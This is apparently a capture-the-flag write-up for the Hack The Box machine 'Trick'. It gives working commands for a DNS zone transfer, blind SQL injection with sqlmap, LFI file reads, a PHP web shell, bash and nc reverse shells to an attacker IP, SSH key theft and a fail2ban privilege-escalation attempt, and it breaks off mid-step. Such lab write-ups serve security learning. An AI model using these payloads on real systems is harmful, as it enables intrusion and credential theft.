[{"contents":"  OS: Linux   Difficulty: Easy   IP Address: 10.10.11.166   Release: 18 / 06 / 2022   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.166 -p 22,25,53,80 Nmap scan report for 10.10.11.166 Host is up (0.23s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA) | 256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA) |_ 256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519) 25/tcp open smtp Postfix smtpd |_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING 53/tcp open domain ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux) | dns-nsid: |_ bind.version: 9.11.5-P4-5.1+deb10u7-Debian 80/tcp open http nginx 1.14.2 |_http-title: Coming Soon - Start Bootstrap Theme |_http-server-header: nginx/1.14.2 Service Info: Host: debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 48.81 seconds  This machine has ports 22 (SSH), 25 (SMTP), 53 (DNS) and 80 (HTTP) open.\nEnumeration If we go to http://10.10.11.166, we will see a page like this:\nThere is nothing useful on this site, the form does not work.\nDNS enumeration Since the machine has a DNS server exposed, we can ask the server to show domains and subdomains using reverse DNS queries. For example:\n$ dig -x 10.10.11.166 @10.10.11.166 ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.10.6 \u0026lt;\u0026lt;\u0026gt;\u0026gt; -x 10.10.11.166 @10.10.11.166 ;; global options: +cmd ;; Got answer: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NOERROR, id: 26900 ;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3 ;; WARNING: recursion requested but not available ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ;; QUESTION SECTION: ;166.11.10.10.in-addr.arpa. IN PTR ;; ANSWER SECTION: 166.11.10.10.in-addr.arpa. 604800 IN PTR trick.htb. ;; AUTHORITY SECTION: 11.10.10.in-addr.arpa. 604800 IN NS trick.htb. ;; ADDITIONAL SECTION: trick.htb. 604800 IN A 127.0.0.1 trick.htb. 604800 IN AAAA ::1 ;; Query time: 38 msec ;; SERVER: 10.10.11.166#53(10.10.11.166) ;; WHEN: Tue Jul 05 11:52:00 CEST 2022 ;; MSG SIZE rcvd: 135  So we can add trick.htb to /etc/hosts. Unfortunately, the above website is the same as http://trick.htb. Moreover, ffuf does not find any subdomain using common wordlists.\nHence, we can try querying the DNS a bit more. For instance, we can perform a Domain Zone Transfer attack:\n$ dig trick.htb @10.10.11.166 axfr ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.10.6 \u0026lt;\u0026lt;\u0026gt;\u0026gt; trick.htb @10.10.11.166 axfr ;; global options: +cmd trick.htb. 604800 IN SOA trick.htb. root.trick.htb. 5 604800 86400 2419200 604800 trick.htb. 604800 IN NS trick.htb. trick.htb. 604800 IN A 127.0.0.1 trick.htb. 604800 IN AAAA ::1 preprod-payroll.trick.htb. 604800 IN CNAME trick.htb. trick.htb. 604800 IN SOA trick.htb. root.trick.htb. 5 604800 86400 2419200 604800 ;; Query time: 50 msec ;; SERVER: 10.10.11.166#53(10.10.11.166) ;; WHEN: Tue Jul 05 12:01:33 CEST 2022 ;; XFR size: 6 records (messages 1, bytes 203)  Foothold So we have preprod-payroll.trick.htb. Now we can see another website at http://preprod-payroll.trick.htb:\nExploiting SQLi At this point, we can try a SQL injection attack, with a common payload:\nAnd we are in as the administrator:\nLet\u0026rsquo;s check the type of SQLi we are exploiting:\n$ curl 'preprod-payroll.trick.htb/ajax.php?action=login' -d \"username='\u0026password=asdf\" \u0026lt;br /\u0026gt; \u0026lt;b\u0026gt;Notice\u0026lt;/b\u0026gt;: Trying to get property 'num_rows' of non-object in \u0026lt;b\u0026gt;/var/www/payroll/admin_class.php\u0026lt;/b\u0026gt; on line \u0026lt;b\u0026gt;21\u0026lt;/b\u0026gt;\u0026lt;br /\u0026gt; 3 $ curl 'preprod-payroll.trick.htb/ajax.php?action=login' -d \"username='+or+1=1--+-\u0026password=asdf\" 1 $ curl 'preprod-payroll.trick.htb/ajax.php?action=login' -d \"username='+or+2=1--+-\u0026password=asdf\" 3  We are in front of a Boolean-based blind SQLi, because the only information we get is 1 (true) or 3 (false). And if the SQL query is incorrect, we see an error that leaks out a path: /var/www/payroll/admin_class.php.\nNow, we can use sqlmap with specific parameters to go straight to the point. First of all, let\u0026rsquo;s enumerate databases:\n$ sqlmap --url 'http://preprod-payroll.trick.htb/ajax.php?action=login' --data username=1 -p username --method POST --technique B --skip-waf --batch --level 5 --dbs ___ __H__ ___ ___[']_____ ___ ___ {1.6.6#stable} |_ -| . [,] | .'| . | |___|_ [']_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting [hh:mm:ss] [INFO]testing connection to the target URL you have not declared cookie(s), while server wants to set its own ('PHPSESSID=i0erqses93k...46t092dbr9'). Do you want to use those [Y/n] Y [hh:mm:ss] [INFO] checking if the target is protected by some kind of WAF/IPS [hh:mm:ss] [INFO] testing if the target URL content is stable [hh:mm:ss] [INFO] target URL content is stable [hh:mm:ss] [INFO] testing if POST parameter 'username' is dynamic [hh:mm:ss] [WARNING]heuristic (basic) test shows that POST parameter 'username' might not be injectable [hh:mm:ss] [INFO] testing for SQL injection on POST parameter 'username' [hh:mm:ss] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause' [hh:mm:ss] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' [hh:mm:ss] [INFO]POST parameter 'username' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable (with --not-string=\"21\") [hh:mm:ss] [INFO]heuristic (extended) test shows that the back-end DBMS could be 'MySQL' it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y for the remaining tests, do you want to include all tests for 'MySQL' extending provided risk (1) value? [Y/n] Y [hh:mm:ss] [INFO] checking if the injection point on POST parameter 'username' is a false positive POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N sqlmap identified the following injection point(s) with a total of 182 HTTP(s) requests: --- Parameter: username (POST) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment) Payload: username=1' AND 3839=(SELECT (CASE WHEN (3839=3839) THEN 3839 ELSE (SELECT 2922 UNION SELECT 7749) END))-- tjdZ --- [hh:mm:ss] [INFO] testing MySQL [hh:mm:ss] [INFO] confirming MySQL [hh:mm:ss] [INFO]the back-end DBMS is MySQL web application technology: PHP, Nginx 1.14.2 back-end DBMS: MySQL \u0026gt;= 5.0.0 (MariaDB fork) [hh:mm:ss] [INFO] fetching database names [hh:mm:ss] [INFO] fetching number of databases [hh:mm:ss] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval [hh:mm:ss] [INFO] retrieved: 2 [hh:mm:ss] [INFO] retrieved: information_schema [hh:mm:ss] [INFO] retrieved: payroll_db available databases [2]: [*] information_schema [*] payroll_db ...  Alright: information_schema and payroll_db. Now we can add the DBMS (MySQL) and the database (payroll_db). What tables are in this database?\n$ sqlmap --url 'http://preprod-payroll.trick.htb/ajax.php?action=login' --data username=1 -p username --method POST --technique B --skip-waf --batch --level 5 --threads 5 --dbms mysql -D payroll_db --tables ___ __H__ ___ ___[)]_____ ___ ___ {1.6.6#stable} |_ -| . ['] | .'| . | |___|_ [(]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting ... [hh:mm:ss] [INFO] fetching tables for database: 'payroll_db' ... Database: payroll_db [10 tables] +---------------------+ | position | | attendance | | deductions | | department | | employee | | employee_allowances | | employee_deductions | | payroll | | payroll_items | | users | +---------------------+ ...  Great, we are interested in the table named users. Let\u0026rsquo;s enumerate columns:\n$ sqlmap --url 'http://preprod-payroll.trick.htb/ajax.php?action=login' --data username=1 -p username --method POST --technique B --skip-waf --batch --level 5 --threads 5 --dbms mysql -D payroll_db -T users --columns ___ __H__ ___ ___[(]_____ ___ ___ {1.6.6#stable} |_ -| . [,] | .'| . | |___|_ [\"]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting ... [hh:mm:ss] [INFO] fetching columns for table 'users' in database 'payroll_db' ... Database: payroll_db Table: users [8 columns] +-----------+--------------+ | Column | Type | +-----------+--------------+ | address | text | | contact | text | | doctor_id | int(30) | | id | int(30) | | name | varchar(200) | | password | varchar(200) | | type | tinyint(1) | | username | varchar(200) | +-----------+--------------+ ...  Nice, let\u0026rsquo;s dump fields name, username and password:\n$ sqlmap --url 'http://preprod-payroll.trick.htb/ajax.php?action=login' --data username=1 -p username --method POST --technique B --skip-waf --batch --level 5 --threads 5 --dbms mysql -D payroll_db -T users -C name,username,password --dump ___ __H__ ___ ___[(]_____ ___ ___ {1.6.6#stable} |_ -| . [,] | .'| . | |___|_ [\"]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting ... [hh:mm:ss] [INFO] fetching entries of column(s) 'name,password,username' for table 'users' in database 'payroll_db' ... Database: payroll_db Table: users [1 entry] +---------------+------------+-----------------------+ | name | username | password | +---------------+------------+-----------------------+ | Administrator | Enemigosss | SuperGucciRainbowCake | +---------------+------------+-----------------------+ ...  Ok, we have a username and a password, but we can\u0026rsquo;t do anything with them. This kind of a rabbit hole.\nFinding an LFI If we continue inspecting the website, we notice a curious query parameter called page, that is being used to render the different pages of the web. It is likely to be vulnerable to Local File Inclusion (LFI) or Directory Path Traversal, because we can add ./ and the web still works:\nIn order to test for LFI, we can use a PHP wrapper like this one (Base64 encoding):\nLet\u0026rsquo;s decode this string in Base64 with some shell scripting. This is home.php:\n$ curl -s 'preprod-payroll.trick.htb/index.php?page=php://filter/convert.base64-encode/resource=home' | grep -A 1 '\u0026lt;main id=\"view-panel\" \u0026gt;' \u0026lt;main id=\"view-panel\" \u0026gt; PD9waHAgaW5jbHVkZSAnZGJfY29ubmVjdC5waHAnID8+DQo8c3R5bGU+DQogICANCjwvc3R5bGU+DQoNCjxkaXYgY2xhc3M9ImNvbnRhaW5lLWZsdWlkIj4NCg0KCTxkaXYgY2xhc3M9InJvdyI+DQoJCTxkaXYgY2xhc3M9ImNvbC1sZy0xMiI+DQoJCQkNCgkJPC9kaXY+DQoJPC9kaXY+DQoNCgk8ZGl2IGNsYXNzPSJyb3cgbXQtMyBtbC0zIG1yLTMiPg0KCQkJPGRpdiBjbGFzcz0iY29sLWxnLTEyIj4NCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkIj4NCiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1ib2R5Ij4NCiAgICAgICAgICAgICAgICAgICAgPD9waHAgZWNobyAiV2VsY29tZSBiYWNrICIuICRfU0VTU0lPTlsnbG9naW5fbmFtZSddLiIhIiAgPz4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgPC9kaXY+DQoJPC9kaXY+DQoNCjwvZGl2Pg0KPHNjcmlwdD4NCgkNCjwvc2NyaXB0Pg== $ curl -s 'preprod-payroll.trick.htb/index.php?page=php://filter/convert.base64-encode/resource=home' | grep -A 1 '\u0026lt;main id=\"view-panel\" \u0026gt;' | grep -v main PD9waHAgaW5jbHVkZSAnZGJfY29ubmVjdC5waHAnID8+DQo8c3R5bGU+DQogICANCjwvc3R5bGU+DQoNCjxkaXYgY2xhc3M9ImNvbnRhaW5lLWZsdWlkIj4NCg0KCTxkaXYgY2xhc3M9InJvdyI+DQoJCTxkaXYgY2xhc3M9ImNvbC1sZy0xMiI+DQoJCQkNCgkJPC9kaXY+DQoJPC9kaXY+DQoNCgk8ZGl2IGNsYXNzPSJyb3cgbXQtMyBtbC0zIG1yLTMiPg0KCQkJPGRpdiBjbGFzcz0iY29sLWxnLTEyIj4NCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkIj4NCiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1ib2R5Ij4NCiAgICAgICAgICAgICAgICAgICAgPD9waHAgZWNobyAiV2VsY29tZSBiYWNrICIuICRfU0VTU0lPTlsnbG9naW5fbmFtZSddLiIhIiAgPz4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgPC9kaXY+DQoJPC9kaXY+DQoNCjwvZGl2Pg0KPHNjcmlwdD4NCgkNCjwvc2NyaXB0Pg== $ curl -s 'preprod-payroll.trick.htb/index.php?page=php://filter/convert.base64-encode/resource=home' | grep -A 1 '\u0026lt;main id=\"view-panel\" \u0026gt;' | grep -v main | base64 -d  \u0026lt;?phpinclude'db_connect.php'?\u0026gt; \u0026lt;style\u0026gt; \u0026lt;/style\u0026gt; \u0026lt;divclass=\"containe-fluid\"\u0026gt; \u0026lt;divclass=\"row\"\u0026gt; \u0026lt;divclass=\"col-lg-12\"\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;divclass=\"row mt-3 ml-3 mr-3\"\u0026gt; \u0026lt;divclass=\"col-lg-12\"\u0026gt; \u0026lt;divclass=\"card\"\u0026gt; \u0026lt;divclass=\"card-body\"\u0026gt; \u0026lt;?phpecho\"Welcome back \".$_SESSION['login_name'].\"!\"?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; \u0026lt;/script\u0026gt;  Since it is a PHP file, we must assume that the server appends the .php extension to the page parameter. In fact, we can execute home.php directly:\n$ curl preprod-payroll.trick.htb/home.php \u0026lt;style\u0026gt; \u0026lt;/style\u0026gt; \u0026lt;div class=\"containe-fluid\"\u0026gt; \u0026lt;div class=\"row\"\u0026gt; \u0026lt;div class=\"col-lg-12\"\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\"row mt-3 ml-3 mr-3\"\u0026gt; \u0026lt;div class=\"col-lg-12\"\u0026gt; \u0026lt;div class=\"card\"\u0026gt; \u0026lt;div class=\"card-body\"\u0026gt; Welcome back ! \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; \u0026lt;/script\u0026gt;  Now we can wrap the previous command into a shell function to read PHP files easily:\n$ function read_file() { curl -s \"preprod-payroll.trick.htb/index.php?page=php://filter/convert.base64-encode/resource=$1\" | grep -A 1 '\u0026lt;main id=\"view-panel\" \u0026gt;' | grep -v main | base64 -d; }  Let\u0026rsquo;s read db_connect.php, which is included in home.php:\n$ read_file db_connect  \u0026lt;?php $conn=newmysqli('localhost','remo','TrulyImpossiblePasswordLmao123','payroll_db')ordie(\"Could not connect to mysql\".mysqli_error($con));  We have a password, we can try accessing as remo using this password in SSH, but it does not work.\nObtaining RCE Since we have LFI, we can turn it to Remote Code Execution (RCE) if we have a way to enter PHP files in the server. Actually, this can be done using SQLi if we have enough privileges. Let\u0026rsquo;s check it:\n$ sqlmap --url 'http://preprod-payroll.trick.htb/ajax.php?action=login' --data username=1 -p username --method POST --technique B --skip-waf --batch --level 5 --threads 5 --dbms mysql --privileges ___ __H__ ___ ___[\"]_____ ___ ___ {1.6.6#stable} |_ -| . [,] | .'| . | |___|_ [']_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting ... [hh:mm:ss] [INFO] fetching entries of column(s) 'name,password,username' for table 'users' in database 'payroll_db' [hh:mm:ss] [INFO] fetching database users privileges [hh:mm:ss] [INFO] fetching database users [hh:mm:ss] [INFO] fetching number of database users [hh:mm:ss] [INFO] resumed: 1 [hh:mm:ss] [INFO] retrieving the length of query output [hh:mm:ss] [INFO] retrieved: 18 [hh:mm:ss] [INFO] retrieved: 'remo'@'localhost' [hh:mm:ss] [INFO] fetching number of privileges for user 'remo' [hh:mm:ss] [INFO] resumed: 1 [hh:mm:ss] [INFO] fetching privileges for user 'remo' [hh:mm:ss] [INFO] retrieving the length of query output [hh:mm:ss] [INFO] retrieved: 4 [hh:mm:ss] [INFO] retrieved: FILE database management system users privileges: [*] %remo% [1]: privilege: FILE ...  So we have privilege FILE, and then we can read and write files to the server if we have privileges at the corresponding directory.\nIn order to write a file, let\u0026rsquo;s use UNION queries. We already know that the current table has 8 columns, so let\u0026rsquo;s go straight to the point:\n$ curl 'preprod-payroll.trick.htb/ajax.php?action=login' -d \"username='+union+select+'\u0026lt;?php+system(\\$_GET[\\\"cmd\\\"]);+?\u0026gt;',2,3,4,5,6,7,8+into+outfile+'/tmp/rev.php'--+-\u0026password=asdf\" \u0026lt;br /\u0026gt; \u0026lt;b\u0026gt;Notice\u0026lt;/b\u0026gt;: Trying to get property 'num_rows' of non-object in \u0026lt;b\u0026gt;/var/www/payroll/admin_class.php\u0026lt;/b\u0026gt; on line \u0026lt;b\u0026gt;21\u0026lt;/b\u0026gt;\u0026lt;br /\u0026gt; 3  Since the file is stored in /tmp, we have enough privileges to store files. Now let\u0026rsquo;s retrieve the file using the LFI (/tmp/rev.php without the .php extension):\nIt shows the file, so now we have RCE:\nLet\u0026rsquo;s access the machine using a reverse shell:\n$ echo -n 'bash -i \u0026gt;\u0026 /dev/tcp/10.10.17.44/4444 0\u0026gt;\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx $ curl -s \"preprod-payroll.trick.htb/index.php?page=../../../../tmp/rev\u0026cmd=echo+YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx+|+base64+-d+|+bash\"  $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.166. Ncat: Connection from 10.10.11.166:42706. bash: cannot set terminal process group (790): Inappropriate ioctl for device bash: no job control in this shell www-data@trick:~/payroll$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null www-data@trick:~/payroll$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm www-data@trick:~/payroll$ export TERM=xterm www-data@trick:~/payroll$ export SHELL=bash www-data@trick:~/payroll$ stty rows 50 columns 158  Lateral movement to user michael Inside the machine, we can see that there is another webpage in /var/www/market:\nwww-data@trick:~/payroll$ cd /var/www www-data@trick:~$ ls -la total 20 drwxr-xr-x 5 michael michael 4096 May 25 13:28 . drwxr-xr-x 12 root root 4096 May 25 13:28 .. drwxr-xr-x 5 michael michael 4096 May 25 13:28 html drwxr-xr-x 6 michael michael 4096 May 25 13:28 market drwxr-xr-x 4 michael michael 4096 May 25 13:28 payroll  We can read the nginx configuration in order to get the corresponding virtual host:\nwww-data@trick:~$ ls /etc/nginx/sites-enabled/ default www-data@trick:~$ cat /etc/nginx/sites-enabled/default | grep trick.htb server_name trick.htb; server_name preprod-marketing.trick.htb; server_name preprod-payroll.trick.htb;  Alright, so after setting preprod-marketing.trick.htb into /etc/hosts, we have this webpage:\nFinding another LFI Again, there is a curious parameter called page that is shouting to be vulnerable to LFI or Directory Path Traversal:\nSince we have access to the machine, we can read the source code for this site and find the following:\nwww-data@trick:~$ cd /var/www/market www-data@trick:~/market$ ls -la total 76 drwxr-xr-x 6 michael michael 4096 May 25 13:28 . drwxr-xr-x 5 michael michael 4096 May 25 13:28 .. -rw-r--r-- 1 michael michael 13272 Apr 16 10:15 about.html -rw-r--r-- 1 michael michael 7677 Apr 16 10:15 contact.html drwxr-xr-x 2 michael michael 4096 May 25 13:28 css drwxr-xr-x 4 michael michael 4096 May 25 13:28 fontawesome -rw-r--r-- 1 michael michael 9660 Apr 16 10:14 home.html drwxr-xr-x 2 michael michael 4096 May 25 13:28 img -rw-r--r-- 1 michael michael 194 Apr 16 10:13 index.php drwxr-xr-x 2 michael michael 4096 May 25 13:28 js -rw-r--r-- 1 michael michael 10757 Apr 16 10:14 services.html www-data@trick:~/market$ cat index.php  \u0026lt;?php $file =$_GET['page']; if (!isset($file) ||($file == 'index.php')) { include('/var/www/market/home.html'); } else{ include('/var/www/market/' . str_replace('../', '', $file)); }  It is including files and applying a sanitization. However, this filtering can be bypassed, because string replacements are not recursive and we can enter \u0026quot;....//\u0026quot;, and it will be transformed to \u0026quot;../\u0026quot;, leading to Directory Path Traversal and another Local File Inclusion.\nLet\u0026rsquo;s access to the /tmp/rev.php again and see if we have changed user:\n$ curl 'preprod-marketing.trick.htb/index.php?page=....//....//....//....//tmp/rev.php\u0026cmd=whoami' michael 2 3 4 5 6 7 8  There it is, we are michael. Hence, we can read its private SSH key:\nwww-data@trick:~/market$ ls -la /home/michael total 84 drwxr-xr-x 15 michael michael 4096 Jul 14 22:12 . drwxr-xr-x 3 root root 4096 May 25 13:28 .. -rw------- 1 michael michael 1256 May 25 13:09 .ICEauthority lrwxrwxrwx 1 root root 9 Apr 22 09:47 .bash_history - /dev/null -rw-r--r-- 1 michael michael 220 Apr 18 2019 .bash_logout -rw-r--r-- 1 michael michael 3526 Apr 18 2019 .bashrc drwx------ 9 michael michael 4096 May 11 21:09 .cache drwx------ 10 michael michael 4096 May 11 21:08 .config drwx------ 3 michael michael 4096 May 11 21:08 .gnupg drwx------ 3 michael michael 4096 May 11 21:07 .local -rw-r--r-- 1 michael michael 807 Apr 18 2019 .profile drwx------ 2 michael michael 4096 May 24 17:25 .ssh -rw------- 1 michael michael 2492 Jul 14 22:12 .viminfo drwxr-xr-x 2 michael michael 4096 May 11 21:07 Desktop drwxr-xr-x 2 michael michael 4096 May 11 21:07 Documents drwxr-xr-x 2 michael michael 4096 May 11 21:07 Downloads drwxr-xr-x 2 michael michael 4096 May 11 21:07 Music drwxr-xr-x 2 michael michael 4096 May 11 21:07 Pictures drwxr-xr-x 2 michael michael 4096 May 11 21:07 Public drwxr-xr-x 2 michael michael 4096 May 11 21:07 Templates drwxr-xr-x 2 michael michael 4096 May 11 21:07 Videos -rw-r----- 1 root michael 33 Jul 14 21:39 user.txt  $ curl 'preprod-marketing.trick.htb/index.php?page=....//....//....//....//home/michael/.ssh/id_rsa' | tee id_rsa -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+ 4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/ Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4 1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0 +93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6 IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/ KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0 fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS 3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+ IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ== -----END OPENSSH PRIVATE KEY-----  And now we can connect to the machine as michael:\n$ chmod 600 id_rsa $ ssh -i id_rsa michael@10.10.11.166 michael@trick:~$ cat user.txt f18c1dcd02ec3adadbd54c9c8c4d94be  Privilege escalation This user is able to run /etc/init.d/fail2ban restart as root without password using sudo:\nmichael@trick:~$ sudo -l Matching Defaults entries for michael on trick: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User michael may run the following commands on trick: (root) NOPASSWD: /etc/init.d/fail2ban restart  After searching for ways to escalate privileges using fail2ban, we reach to this blog post.\nNotice that we have an additional group, and this group owns the directory /etc/fail2ban/action.d:\nmichael@trick:~$ id uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security) michael@trick:~$ find / -group security 2\u0026gt;/dev/null /etc/fail2ban/action.d michael@trick:~$ ls -l /etc/fail2ban total 60 drwxrwx--- 2 root security 4096 Jul 6 04:21 action.d -rw-r--r-- 1 root root 2334 Jul 6 04:21 fail2ban.conf drwxr-xr-x 2 root root 4096 Jul 6 04:21 fail2ban.d drwxr-xr-x 3 root root 4096 Jul 6 04:21 filter.d -rw-r--r-- 1 root root 22908 Jul 6 04:21 jail.conf drwxr-xr-x 2 root root 4096 Jul 6 04:21 jail.d -rw-r--r-- 1 root root 645 Jul 6 04:21 paths-arch.conf -rw-r--r-- 1 root root 2827 Jul 6 04:21 paths-common.conf -rw-r--r-- 1 root root 573 Jul 6 04:21 paths-debian.conf -rw-r--r-- 1 root root 738 Jul 6 04:21 paths-opensuse.conf  The blog post says that one way to run commands is entering an actionban with a malicious command in iptables-multiport.conf. If we try to modify the file, we are not allowed:\nmichael@trick:~$ ls -l /etc/fail2ban/action.d/iptables-multiport.conf -rw-r--r-- 1 root root 1420 Jul 6 04:00 /etc/fail2ban/action.d/iptables-multiport.conf michael@trick:~$ echo 'actionban = nc -e /bin/bash 10.10.17.44 4444' \u0026gt;\u0026gt; /etc/fail2ban/action.d/iptables-multiport.conf -bash: /etc/fail2ban/action.d/iptables-multiport.conf: Permission denied  However, since we belong to security and this group owns the directory, we are able to create and remove files. Then, let\u0026rsquo;s create a copy of the needed file, remove it and create it again with the malicious content (for instance, a reverse shell command):\nmichael@trick:~$ cp /etc/fail2ban/action.d/iptables-multiport.conf /tmp/x 